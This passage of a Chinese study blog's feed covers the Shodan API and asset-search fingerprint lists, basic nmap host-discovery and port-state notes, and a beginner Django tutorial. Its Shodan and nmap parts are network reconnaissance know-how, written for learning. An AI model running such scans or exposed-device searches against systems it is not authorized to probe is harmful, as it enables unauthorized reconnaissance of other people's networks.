&lt;&#x2F;span&gt;&lt;span&gt;shodan.Shodan(key) ：初始化连接API &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.count(query, facets=None)：返回查询结果数量 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.host(ip, history=False)：返回一个IP的详细信息 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.ports()：返回Shodan可查询的端口号 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.protocols()：返回Shodan可查询的协议 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.services()：返回Shodan可查询的服务 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.queries(page=1, sort=&amp;#39;timestamp&amp;#39;, order=&amp;#39;desc&amp;#39;)：查询其他用户分享的查询规则 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型 &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Shodan.search(query, page=1,limit=None, offset=None, facets=None, minify=True)：查询Shodan数据&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;另：zoomeye   https:&#x2F;&#x2F;www.zoomeye.org&#x2F;doc?channel=api&lt;&#x2F;p&gt;
&lt;p&gt;​		FOFA      https:&#x2F;&#x2F;fofa.so&#x2F;help	https:&#x2F;&#x2F;fofa.so&#x2F;rules&#x2F;library   https:&#x2F;&#x2F;fofa.so&#x2F;library&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;网站模块&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;pagespeed， mod_bwlimited， mod_auth_passthrough， mod_auth_pam， mod_fastcgi， mod_jk， mod_perl， mod_python， mod_rack， mod_rails， mod_ssl， mod_wsgi， mod_antiloris，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;广告联盟&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;doubleclick_ad， baidu广告联盟， Google_AdSense， Open_AdStream， adinfinity， adriver，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;反向代理服务器&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;squid， kangle反向代理， Varnish， Aicache， SJSWPS_ OiWPS， HAProxy_Report，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;脚本语言&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;PHP， ASP.NET， python， ruby， jsp， perl， nodejs， ASP，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;前端库&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;jquery， bootstrap， d3， jquery-ui， yui， AlloyUI，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;分享模块&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;jiathis， ujian， 百度分享， joomla-facebook， addthis， hellobar，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;路由器&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;百为路由， 锐捷NBR路由器， mikrotik， 中兴路由器， h3c路由器， jcg无线路由器， D-Link_VoIP_Wireless_Router， arrisi_Touchstone， ZyXEL， Ruckus， Motorola_SBG900， Wimax_CPE， Cisco_Cable_Modem， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， DI-804HV， HuaweiHomeGateway， TP-LINK无线路由器，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;云评论&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;uyan， disqus，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;统计模块&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;google-analytics， cnzz， baidu统计， 51la， CNZZ统计， awstats_misc_tracker， advancedwebstats， hubspot， 51yes， Piwik，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;开发框架&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;ThinkPHP， Swiftlet， Aspnetmvc， CodeIgniter， ColdFusion， WebObjects， cakephp， Django， zikula_framework， NetteFramework， Fat-FreeFramework， Play-Framework， Restlet-Framework， Kohana-Framework， flow_framework， SIMIT_framework， axis2-web，&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;其他&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mongodb， elasticsearch， phpMyadmin， MVB2000， GPSweb， Tumblr， phpinfo， AD_RS设备， FrontPageServerExtension， 认证页面， TCN协议， sharepoint， MS-Author-Via， 3COM_NBX， wspx， rack-cache， Dnnoutputcache， Iisexport， Oraclea-DMS， P3p_enabled， X-72e-Nobeian-Transfer， ManagedFusion， Adblock， Blackboard， LiquidGIS， Cocoon， Wp-Super-Cache， pagespeed， Alternate-Protocol， unbouncepages， lemis管理系统， OpenSSL， mod_bwlimited， mod_auth_passthrough， FreeboxOS， SMA_Sunny_Webbox， Wimax_CPE， Aethra_Telecommunications_Operating_System， Scientific-Atlanta_Cable_Modem， rap， ZTE_MiFi_UNE， 用友商战实践平台， moosefs， AirLink_modem， CCProxy， APC_Management， HuaweiHomeGateway， TP-LINK无线路由器， 蓝盾BDWebGuard， 护卫神网站安全系统， phpDocumentor， ColdFusion， Adobe_ CQ5， Adobe_GoLive， Adobe_RoboHelp， Amaya， PHP-CGI， Synology_NAS， OpenMas， __VIEWSTATE， Chromelogger， Communique， recaptcha， IPFire， TerraMaster， 创星伟业校园网群， 正方教务管理系统， UFIDA_NC， 北创图书检索系统， Facebook_insights， sq&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>NMAP</title>
		<published>2020-09-04T00:00:00+00:00</published>
		<updated>2020-09-04T00:00:00+00:00</updated>
		<link href="https://baz.ee/nmap/" type="text/html"/>
		<id>https://baz.ee/nmap/</id>
		<content type="html">&lt;h1 id=&quot;nmap&quot;&gt;NMAP&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;&#x2F;code&gt;namp 127.0.0.1&lt;&#x2F;p&gt;
&lt;p&gt;​		   namp localhost&lt;&#x2F;p&gt;
&lt;p&gt;​		   namp www.baidu.com&lt;&#x2F;p&gt;
&lt;p&gt;​			nmap 192.168.43.0&#x2F;24&lt;&#x2F;p&gt;
&lt;p&gt;​			nmap  10.0.0,1,3-7.0-255&lt;&#x2F;p&gt;
&lt;p&gt;【问】端口范围&lt;&#x2F;p&gt;
&lt;p&gt;【问】TCP三次握手&lt;&#x2F;p&gt;
&lt;p&gt;【问】ICMP协议的常见应用是什么&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;默认情况下：&lt;&#x2F;p&gt;
&lt;p&gt;1-1024 端口范围内对外开放的服务&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nmap -iR&lt;&#x2F;code&gt;随机选取目标&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nmap -iL&lt;&#x2F;code&gt;从主机&#x2F;网络列表输入&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nmap -exclude&lt;&#x2F;code&gt;排除&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;nmap -excludefile&lt;&#x2F;code&gt;排除文件&lt;&#x2F;p&gt;
&lt;h3 id=&quot;zhu-ji-fa-xian&quot;&gt;主机发现&lt;&#x2F;h3&gt;
&lt;p&gt;常见的方法有：ping、tcp、udp&lt;&#x2F;p&gt;
&lt;h6 id=&quot;ping-sao-miao&quot;&gt;ping 扫描&lt;&#x2F;h6&gt;
&lt;p&gt;nmap -sn 192.168.43.236&lt;&#x2F;p&gt;
&lt;p&gt;​		 -sP 192.168.43.236&lt;&#x2F;p&gt;
&lt;h6 id=&quot;xxx&quot;&gt;XXX&lt;&#x2F;h6&gt;
&lt;p&gt;&lt;strong&gt;open 开放&lt;&#x2F;strong&gt;：应用程序正在该端口接收TCP 连接或者UDP报文。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;closed 关闭&lt;&#x2F;strong&gt;：关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。如果有防火墙封锁，那么该端口会显示为被过滤状态。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;filtered 过滤&lt;&#x2F;strong&gt;：由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则或者主机上的软件防火墙。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;unfiltered 未过滤&lt;&#x2F;strong&gt;：未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定端口是否开放。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;打开｜过滤&lt;&#x2F;strong&gt;：当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;关闭｜过滤&lt;&#x2F;strong&gt;：该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Django</title>
		<published>2020-08-31T00:00:00+00:00</published>
		<updated>2020-08-31T00:00:00+00:00</updated>
		<link href="https://baz.ee/django/" type="text/html"/>
		<id>https://baz.ee/django/</id>
		<content type="html">&lt;p&gt;Django基础&lt;&#x2F;p&gt;
&lt;p&gt;什么是框架？&lt;&#x2F;p&gt;
&lt;p&gt;框架是一组封装完好的程序包，软件开发者基于框架可以快速高效的开发出符合代码规格的产品&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;框架的本质就是将一堆可以复用的代码提取出来，减少重复造轮子，开发者只需要专注于核心业务逻辑和代码&lt;&#x2F;p&gt;
&lt;p&gt;常见的框架：&lt;&#x2F;p&gt;
&lt;p&gt;web前端框架：BootStrap  JQuery React&lt;&#x2F;p&gt;
&lt;p&gt;web后端框架：Django   Flask   Struts   Sprint   ThinkPHP&lt;&#x2F;p&gt;
&lt;p&gt;安全渗透：Metaspolit&lt;&#x2F;p&gt;
&lt;p&gt;Django介绍&lt;&#x2F;p&gt;
&lt;p&gt;Django是目前最流行最成熟的Python web框架之一&lt;&#x2F;p&gt;
&lt;p&gt;免费开源&lt;&#x2F;p&gt;
&lt;p&gt;特点：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;社区活跃，功能全面，文档完整，开发案例最多&lt;&#x2F;li&gt;
&lt;li&gt;全面支持ORM数据库的操作，管理后台，表单处理，URL映射、HTML模板引擎等一系列的web解决方案&lt;&#x2F;li&gt;
&lt;li&gt;基于MVC&#x2F;MTV架构，使得各个模块之间相互独立又能有效组合，有非常好的拓展性。&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;MVC架构：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827011332960.png&quot; alt=&quot;image-20200827011332960&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;controller：控制器，作为model和view的桥梁，接收用户请求，获取和更新model中的数据，告知view该如何呈现&lt;&#x2F;p&gt;
&lt;p&gt;model：模型，负责与web业务相关的数据逻辑处理，包括数据库的增删查改等操作&lt;&#x2F;p&gt;
&lt;p&gt;view：视图，负责数据的显示和呈现，显示的内容基于model数据&lt;&#x2F;p&gt;
&lt;p&gt;MTV架构：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;image-20200827011442060.png&quot; alt=&quot;image-20200827011442060&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;model：与MVC中的model功能一致&lt;&#x2F;p&gt;
&lt;p&gt;view：类似于MVC中的controller&lt;&#x2F;p&gt;
&lt;p&gt;template：类似于MVC中的view&lt;&#x2F;p&gt;
&lt;p&gt;数据逻辑（model）涉及到数据操作，例如MySQL&lt;&#x2F;p&gt;
&lt;p&gt;视图逻辑（template）涉及web前端页面的开发。HTML、CSS、JS&lt;&#x2F;p&gt;
&lt;p&gt;控制逻辑（view）涉及web后端开发技术。Python、PHP、Java&lt;&#x2F;p&gt;
&lt;p&gt;Django环境安装：pip3 install  -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple django==2.2.7&lt;&#x2F;p&gt;
&lt;p&gt;查看安装：pip3(pip) list&lt;&#x2F;p&gt;
&lt;p&gt;升级pip：pip install --upgrade pip -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&lt;&#x2F;p&gt;
&lt;p&gt;安装数据库驱动：pip3 install mysql-connector-python -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&lt;&#x2F;p&gt;
&lt;p&gt;kali启动数据库：service mysql start&lt;&#x2F;p&gt;
&lt;p&gt;然后通过命令mysql -u root -p进行登录，默认密码为root&lt;&#x2F;p&gt;
&lt;p&gt;创建项目&lt;&#x2F;p&gt;
&lt;p&gt;Django-admin startproject mysite&lt;&#x2F;p&gt;
&lt;p&gt;创建成功之后，有mysite文件夹还有一个manage.py&lt;&#x2F;p&gt;
&lt;p&gt;urls.py 网址映射，将用户输入的url映射到后台逻辑视图&lt;&#x2F;p&gt;
&lt;p&gt;setting.py 全局系统参数设置&lt;&#x2F;p&gt;
&lt;p&gt;wsgi.py 定义WSGI接口，用来与web服务器联动&lt;&#x2F;p&gt;
&lt;p&gt;_&lt;em&gt;init&lt;&#x2F;em&gt;_.py 让Python把该目录当做是一个开发包&lt;&#x2F;p&gt;
&lt;p&gt;manage.py Django的命令行管理工具，用于启动服务，数据库同步，创建管理员等操作&lt;&#x2F;p&gt;
&lt;p&gt;templates(目录) 放置静态web文件，比如html css js 图片&lt;&#x2F;p&gt;
&lt;p&gt;运行django&lt;&#x2F;p&gt;
&lt;p&gt;python manage.py runserver&lt;&#x2F;p&gt;
&lt;p&gt;创建项目app&lt;&#x2F;p&gt;
&lt;p&gt;python manage.py startapp jianyidjango&lt;&#x2F;p&gt;
&lt;p&gt;就会在djangocms目录下面出现一个新目录 jianyidjango&lt;&#x2F;p&gt;
&lt;p&gt;然后打开新目录，就可以看到各个py文件&lt;&#x2F;p&gt;
&lt;p&gt;整个项目文件就创建好了，接下来往里面填充内容&lt;&#x2F;p&gt;
&lt;p&gt;Django第一个项目&lt;&#x2F;p&gt;
&lt;p&gt;项目描述&lt;&#x2F;p&gt;
&lt;p&gt;DjangoCMS用户信息管理系统&lt;&#x2F;p&gt;
&lt;p&gt;\1.   当用户访问主页时，看到用户欢迎页&lt;&#x2F;p&gt;
&lt;p&gt;\2.   点击用户欢迎页里面的主页按钮，能够跳转到用户管理页&lt;&#x2F;p&gt;
&lt;p&gt;\3.   用户管理页需要具备信息的增删改功能，并且能够跳转到用户欢迎页和用户列表页&lt;&#x2F;p&gt;
&lt;p&gt;\4.   点击用户管理页的查询用户列表按钮，可以跳转到用户列表页&lt;&#x2F;p&gt;
&lt;p&gt;第一步：新建app &lt;&#x2F;p&gt;
&lt;p&gt;python3 nanage.py startapp jianyidjango&lt;&#x2F;p&gt;
&lt;p&gt;第二步：欢迎页实现&lt;&#x2F;p&gt;
&lt;p&gt;views编写&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;django.http &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;HttpResponse&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;welcome&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;request&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HttpResponse&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;欢迎您的访问！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;urls映射&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;jianyidjango.views &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;welcome&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;urlpatterns = [&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;path&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;admin&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;, admin.site.urls),&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;path&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&amp;#39;, welcome),&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;views进化&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;welcome&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;request&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HttpResponse&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;h1&amp;gt;欢迎您的访问！&amp;lt;&#x2F;h1&amp;gt;&amp;lt;p&amp;gt;点击以下的链接，可以进入jianyidjango主页！&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;welcome&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;request&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	content=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;h1&amp;gt;欢迎您的访问！&amp;lt;&#x2F;h1&amp;gt;&amp;lt;p&amp;gt;点击以下的链接，可以进入jianyidjango主页！&amp;lt;&#x2F;p&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HttpResponse&lt;&#x2F;span&gt;&lt;span&gt;(content)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;因为在vscode中，需要自己手工创建templates目录。所以就需要在settings.py中设置templates路径&lt;&#x2F;p&gt;
&lt;p&gt;templates创建的时候，要放在和jianyidjango同一级目录下&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Django&#x2F;clip_image001.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;render和HTTPresponse的区别&lt;&#x2F;p&gt;
&lt;p&gt;首先在django中使用他们需要导入
from django.http import HttpResponse
from django.shortcuts import render, redirect&lt;&#x2F;p&gt;
&lt;p&gt;1、HttpResponse
作用：内部传入一个字符串参数，然后发送给浏览器&lt;&#x2F;p&gt;
&lt;p&gt;2、render
render可以接受三个参数：
一个是 request参数
一个是html模板文件
一个是保存具有数据的字典参数。 如：{key:value}形式
作用：将数据以字典形式填充到html模板文件中，最后将结果返回给浏览器&lt;&#x2F;p&gt;
&lt;p&gt;3、redirect
redirect 是重定向函数 调用函数后直接跳转到url地址
作用：接受一个url参数，表示让浏览器条专区制定的url
redirect 是 HttpResponsedirect 的缩写
例：return redirect(’&#x2F;www.baidu.com&#x2F;’) 里面的url是一个绝对地址
reverse是反向解析
return redirect(reverse(“week:index”))&lt;&#x2F;p&gt;
&lt;p&gt;index.html设置&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;html&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;html &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;lang&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;en&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;meta &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;charset&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;UTF-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;jianyidjango主页&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;title&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;head&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;body&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;h1&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;jianyidjango主页&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;h1&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;h3&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;填写你的个人信息到以下表单&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;h3&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;method&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;POST&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;action&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;#&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;placeholder&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;请输入姓名&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;
